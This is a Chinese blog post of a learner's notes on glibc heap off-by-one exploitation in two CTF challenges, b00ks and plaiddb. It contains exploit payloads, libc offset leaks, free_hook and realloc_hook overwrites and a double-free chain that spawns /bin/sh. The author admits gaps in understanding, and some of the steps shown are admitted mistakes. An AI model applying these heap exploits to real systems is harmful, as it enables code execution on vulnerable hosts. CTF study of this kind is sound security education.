---
categories: 二进制
date: 2021-04-28 15:06:21
layout: post
tags: null
title: 堆利用(三)之offbyone
---

本文主要记录阅读一些文章时的笔记及总结

## 一、Asis CTF 2016 b00ks wp (null off-by-one)【详】



文章地址 https://www.jianshu.com/p/56acd25fd02a

先看一道例题 b00ks。

漏洞的位置是输入名字那里。调试的时候输入的name为'a'*30+'bc'。
然后pwndbg中search abc。
![1](/chunk_offbyone/1.jpg)
构造堆块1
![2](/chunk_offbyone/2.png)
```python
createbook(150, "kkbook1", 0x100, "haha")
```

存放name和description的内存结构如下

![3](/chunk_offbyone/3.png)

edit1号块的时候，是从discription开始写的。



用print输出book1，就会得到book1的地址。

`book1_addr ==> 0x5555557581d0`



在book1中构造一个fake_chunk。使fake_book1_name指向book2_des，fake_book1_des指向book2_des。book1_des的地址是 0x5555557580c0

```python
payload = "a" * 0x40 + p64(0x01) + p64(book1_addr + 0x40) + p64(book1_addr + 0x38) + p64(0xffff)
```

![4](/chunk_offbyone/4.png)

接下来我们修改作者，溢出，使得book1变为我们构造的fake_book1。

![5](/chunk_offbyone/5.png)

![6](/chunk_offbyone/6.png)

计算基址：

mmap分配的地址如下

![7](/chunk_offbyone/7.png)

libc的地址如下

![8](/chunk_offbyone/8.png)

`offset = book2_name_addr - 0x00007ffff7a0d000 = 0x4da010`

```python
pwndbg> distance 0x7ffff7a0d000 0x00007ffff7ee7010
0x7ffff7a0d000->0x7ffff7ee7010 is 0x4da010 bytes (0x9b402 words)
```

自己设置的加载基址是不变的，但是本题开启了PIE，每次基址都是不同的，所以需要算一下。

接下来泄漏一些重要函数的地址

```python
free_hook_addr = libc_base + libc.symbols["__free_hook"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + libc.search("/bin/sh").next()

----

book2_name_addr ==> 0x7ffff7ee7010
book2_des_addr ==> 0x7ffff7918010
libc_base ==> 0x7ffff7a0d000
free_hook_addr ==> 0x7ffff7dd37a8
system_addr ==> 0x7ffff7a0d000
binsh_addr ==> 0x7ffff7b99e17

```

记录一下内存结构

```python
#起始
0x55555575605d-0x35+0x8

#堆块1
0x00005555557581d0--->0x0000555555758100
#堆块1-description

pwndbg> telescope 0x0000555555758100
00:0000│   0x555555758100 ◂— 0x1
01:0008│   0x555555758108 —▸ 0x555555758210 —▸ 0x7ffff7918010 ◂— 'hello world'
02:0010│   0x555555758110 —▸ 0x555555758208 —▸ 0x7ffff7ee7010 ◂— 0x326b6f6f626b6b /* 'kkbook2' */
03:0018│   0x555555758118 ◂— 0xffff
04:0020│   0x555555758120 ◂— 0x0
... ↓

```

![9](/chunk_offbyone/9.png)



此时edit 1号块，就会修改1的description部分，即跳转到堆块2的name部分。

![10](/chunk_offbyone/10.png)



再edit 2号块，修改的是2号块的des 

```python
editbook(2, p64(system_addr))
```

![11](/chunk_offbyone/11.png)



ida中查看free函数

![12](/chunk_offbyone/12.png)

free了3个指针，2号堆块的name处存放的是 /bin/sh，des处存放的是free_hook。[此篇文章](https://blog.csdn.net/qq_38204481/article/details/81320898) 中说了 __free_hook函数在内存中前面紧挨的是它的参数，所以要把2号块的name处放/bin/sh。free_hook前面就是/bin/sh。

所以free(2)，就会执行system(/bin/sh)，即可getshell。

![13](/chunk_offbyone/13.png)



参考的文章https://www.jianshu.com/p/56acd25fd02a 中，

![14](/chunk_offbyone/14.png)

如果这个计算是正确的话，也就是说，指针原本指向的就是name区域？



还参考了如下文章

[初探off-by-one之Asis CTF 2016 b00ks](https://blog.csdn.net/qq_41918771/article/details/101347234)

[Asis CTF 2016 b00ks](https://blog.csdn.net/qq_33528164/article/details/79778690?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-5.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-5.control)

[__free_hook 劫持原理](http://blog.eonew.cn/archives/521)

[off by one 利用原理](https://www.dazhuanlan.com/2019/08/22/5d5def6881498/)

## 二、ctf-wiki



文章地址 https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/

1、示例一运行失败，最多只能覆盖16字节，当传入17个字节时，会报错。可能是加入了一些检查机制。

![15](/chunk_offbyone/15.png)



2、题目2---plaidctf 2015 plaiddb

题目下载地址 https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore，直接拖到虚拟机里即可。

```python
预先参考博客：
https://bbs.pediy.com/thread-246966.htm
```



开启的保护如下

```python
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

运行程序，发现PUT是输入，GET和DUMP都可以输出内容，DUMP是输出所有内容，DEL是删除内容。

![16](/chunk_offbyone/16.png)



ida中分析，发现GET和PUT最开始都会调用sub_1040进行单行读取。

![17](/chunk_offbyone/17.png)

红框下面的v1=0，存在off by one漏洞。



参考https://bbs.pediy.com/thread-246966.htm，利用过程如下

```python
DEL("th3fl4g")  #delet th3fl4g

PUT("A"*0x8, 0x80, p8(1)*0x80)
PUT("B"*0x8, 0x18, p8(2)*0x18)
PUT("C"*0x8, 0x60, p8(3)*0x60)
PUT("D"*0x8, 0xf0, p8(4)*0xf0)
```

内存结构如下

```python
pwndbg> heap
0x555555758000 FASTBIN {
  prev_size = 0, 
  size = 65, #计算出下一个堆块的位置
  fd = 0x555555758090, #key A的地址
  bk = 0x80, #A的size
  fd_nextsize = 0x5555557580b0, #A data的地址
  bk_nextsize = 0x0
}#这个是struct A节点

0x555555758040 FASTBIN {
  prev_size = 1, 
  size = 33, 
  fd = 0x202020202020202, 
  bk = 0x202020202020202, 
  fd_nextsize = 0x202020202020202, 
  bk_nextsize = 0x21
}#B节点的data

0x555555758060 FASTBIN {
  prev_size = 144680345676153346, 
  size = 33, 
  fd = 0x4242424242424242, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}#B节点的key

0x555555758080 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x4141414141414141, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x91
}#A节点的key

0x5555557580a0 PREV_INUSE {
  prev_size = 0, 
  size = 145, 
  fd = 0x101010101010101, 
  bk = 0x101010101010101, 
  fd_nextsize = 0x101010101010101, 
  bk_nextsize = 0x101010101010101
}#A节点的data

0x555555758130 FASTBIN {
  prev_size = 0, 
  size = 65, 
  fd = 0x555555758070, #B的key的地址
  bk = 0x18, #B的大小
  fd_nextsize = 0x555555758050, #B的data
  bk_nextsize = 0x555555758010 #存放A data的地址
}#struct B节点

0x555555758170 FASTBIN {
  prev_size = 0, 
  size = 65, 
  fd = 0x5555557581c0, #C的key的地址
  bk = 0x60, #C的size
  fd_nextsize = 0x5555557581e0, #C的data的地址
  bk_nextsize = 0x0
}#struct C节点

0x5555557581b0 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x4343434343434343, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x71
}#C的key

0x5555557581d0 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x303030303030303, 
  bk = 0x303030303030303, 
  fd_nextsize = 0x303030303030303, 
  bk_nextsize = 0x303030303030303
}#C的data

0x555555758240 FASTBIN {
  prev_size = 0, 
  size = 65, 
  fd = 0x555555758290, #D的key的地址
  bk = 0xf0, #D的size
  fd_nextsize = 0x5555557582b0, #D的
  bk_nextsize = 0x0
}#struct D

0x555555758280 FASTBIN {
  prev_size = 1, 
  size = 33, 
  fd = 0x4444444444444444, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x101
}#D key

0x5555557582a0 PREV_INUSE {
  prev_size = 0, 
  size = 257, 
  fd = 0x404040404040404, 
  bk = 0x404040404040404, 
  fd_nextsize = 0x404040404040404, 
  bk_nextsize = 0x404040404040404
}#D data

0x5555557583a0 PREV_INUSE {
  prev_size = 0, 
  size = 134241, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}#top chunk

```

这是正常分配的时候

如果原本的D去覆盖C，如下：(不知道为什么要这样，最开始以为是手误打错了，但是后来发现并不是手误！非常巧妙)

```python
DEL("th3fl4g")  #delet th3fl4g

PUT("A"*0x8, 0x80, p8(1)*0x80)
PUT("B"*0x8, 0x18, p8(2)*0x18)
PUT("C"*0x8, 0x60, p8(3)*0x60)
PUT("C"*0x8, 0xf0, p8(4)*0xf0)
```



并且此时bins的结构如下：

![18](/chunk_offbyone/18.png)

```python
0x1d0 原本是C的data
0x240 原本是D的struct
0x280 原本是D的key，但是现在被清零了
```



现在，0x582a0存储的是C的data，通过off_by_one溢出覆盖0x582a0的pre_size位。

覆盖前是这样

![19](/chunk_offbyone/19.png)

而实际上前面的chunk 已经在fastbin中了。再次分配的时候，会分配出0x280这个堆块。由于它的大小为0x20，所以我们分配时申请的D堆块的大小也是0x20。

```python
PUT("D"*0x8+p64(0)+p64(0x200), 0x20, p8(0)*0x20)
```

分配之后如下

![20](/chunk_offbyone/20.png)

p64(0x200)伪造了0x582a0的chunk的pre_size为0x200，因为从0x582a0向前0x200个字节恰好是0x580a0,即堆块A对应的data的地址。

```python
double free
DEL("A"*0x8)
DEL("C"*0x8)
```

这就将0x580a0至0x583a0的内存都free掉了。

![21](/chunk_offbyone/21.png)

此时0x580a0块的大小为0x300

![22](/chunk_offbyone/22.png)

其被分到了unsortedbin中，bins中只有一个chunk时，其fd、bk指针均指向main_arena



bins结构如下

![23](/chunk_offbyone/23.png)

0x70: 0x5555557581d0 ◂— 0x0   ------->这个chunk内存被释放了两次，我们最后也是通过他来实现double` `free的利用。



B还没有释放，可以根据B泄漏出libc的基地址等信息。

![24](/chunk_offbyone/24.png)

0x58140处存放的是B的key的地址，0x18是B的大小。



现在unsortedbin位置处的值是0x580a0，我们再分配出一个堆块，它会从unsortedbin中切下一块给我们，如果申请的大小为0x88，实际上分配的就是0x90，0x580a0+0x90=0x58130。

```python
PUT("a", 0x88, p8(6)*0x88)
```

![25](/chunk_offbyone/25.png)

现在0x58140处的值就变成了main_arena+88的值。

![26](/chunk_offbyone/26.png)



遇到的问题：怎么把这个main_arena的值输出来呢？

按照正常的方法去输出，显示如下：

```python
GET("B"*0x8)
addr = u64(rc(8).ljust(8,'\x00'))
```

![27](/chunk_offbyone/27.png)

![28](/chunk_offbyone/28.png)

这是因为我还是没深入理解！参考 https://xz.aliyun.com/t/6169

此时堆块B就是

![29](/chunk_offbyone/29.png)

而这里的size 140737351850872 就是泄漏出的main_arena+88的地址。因为分析原来的结构，我们知道size处被填上了这个地址。

```python
>>> hex(140737351850872)
'0x7ffff7dd1b78'
>>> hex(0x7ffff7dd1b78-0x88)
'0x7ffff7dd1af0'
```

接下来参考堆利用(一)，得到libc的基地址。但是原本文章里的偏移在此处不适用，尝试用虚拟机中的数据库直接得到偏移。



```python
0x7ffff7dd1b78 - 0x88 = 0x7ffff7dd1af0 #即是 main_arena 的地址

0x7ffff7dd1af0 - 0x3c4af0 = 0x7ffff7a0d000 #即是 libc的基地值
```

```python
main_arena偏移记录

libc6_2.23-0ubuntu3_i386.so ---> 0x1b2780
libc6_2.23-0ubuntu3_amd64.so ---> 0x3c3b20

libc6_2.23-0ubuntu10_amd64.so ---> 0x3c4b20

libc6-amd64_2.23-0ubuntu3_i386.so ---> 0x39bb20

2.23(main_arena+88) ---> 0x3c4b78
```

验证：

![30](/chunk_offbyone/30.png)



⚠️原本一直找不对，是因为我已经先减掉0x88了，而别人的博客中exp没去减掉这个0x88，直接用\- 0x3c4b78即可。

```python
0x7ffff7dd1b78 -  0x3c4b78 = 0x7ffff7a0d000

而：
0x3c4af0 + 0x88 = 0x3c4b78
```

虽然还是没有明白是怎么确定`0x3c4b78`这个值的，但是很多博客里面直接就这样写了，我也先这样操作好了👌



one_gadget如下：

![31](/chunk_offbyone/31.png)

```python
main_arena = 0x7ffff7dd1af0
print "main_arena --->" + hex(main_arena)
libc_base = 0x7ffff7dd1af0 - 0x3c4af0
print "libc --->" + hex(libc_base)
system = libc_base + libc.sym["system"]
binsh = libc_base + libc.search('/bin/sh').next()
print "system --->" + hex(system)
print "binsh --->" + hex(binsh)
one_gadget = libc_base + 0xf0364
print "one_gadget --->" + hex(one_gadget) + '\n'
malloc_hook = libc_base + libc.sym["__malloc_hook"]
realloc = libc_base + libc.sym["realloc"]
```



接下来，利用fastbins中大小为0x70的块，进行double free。

![32](/chunk_offbyone/32.png)



以下是为了保护内存，并把realloc_hook写到那个堆块的fd处。

```python
heap_base = 0x555555758000

payload = p64(heap_base+0x70) 
payload += p64(0x18)
payload += p64(heap_base+0x50)
payload += p64(0)*2
payload += p64(heap_base+0x250)
payload += p64(0)+p64(0x41)
payload += p64(heap_base+0x3e0)
payload += p64(0x88)
payload += p64(heap_base+0xb0)
payload += p64(0)*2
payload += p64(heap_base+0x250)
payload += p64(0)*5+p64(0x71)
payload += p64(realloc)
PUT("b"*0x8, 0xa8, payload) #会先从58130开始分配。在前面我们尽量保持所有内容不变。
```



此时，0x581d0的fd指针指向了realloc_hook，

![33](/chunk_offbyone/33.png)

![34](/chunk_offbyone/34.png)



下面操作的目的是：使得realloc_hook指向one_gadget，这是通过一系列的PUT操作来实现的。

PUT C块，原本的内存如下：

![35](/chunk_offbyone/35.png)

![36](/chunk_offbyone/36.png)



PUT D块前，原本的内存结构如下

![37](/chunk_offbyone/37.png)

构造之后

![38](/chunk_offbyone/38.png)

(后来检查的时候发现这里构造错了，58230之后还要有两个0)

堆块D的struct如下

![39](/chunk_offbyone/39.png)

不知道为什么 原本有的payload没有在内存中显示出来。



...两个月后再次看这道题，因为自己期间换过一次内核，所以地址略微有些许滴不一样。

理解一下后面的思路吧～

再构建一个e堆块，这里应该是触发漏洞

```python
payload = p8(0)*0xb
payload += p64(system_addr)
payload += p8(0)*0x4d
PUT("e"*0x8, 0x60, payload)

payload = "/bin/sh"
payload += p8(0)*0x12
GET(payload)
```

其实到现在这里还是不太理解，但是这个题略微复杂了一些，不适合我这种(学了两年半的)新手，就先亦已焉哉。